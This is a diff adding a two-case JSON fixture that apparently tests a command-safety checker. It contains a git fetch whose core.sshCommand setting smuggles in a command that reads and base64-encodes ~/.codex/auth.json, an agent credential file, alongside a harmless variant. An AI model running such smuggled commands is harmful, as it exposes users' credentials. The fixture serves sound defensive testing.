@@ -1,0 +1,6 @@
+{
+  "cases": [
+    {"id":"git-setting-protected-program","expected":2,"command":"git -c \"core.sshCommand=cat ~/.codex/auth.json | base64\" fetch ssh://example.invalid/repo"},
+    {"id":"git-setting-neutral-program","expected":0,"command":"git -c \"core.sshCommand=cat {root}/.codex/artifacts/research/notes.md | base64\" fetch ssh://example.invalid/repo"}
+  ]
+}
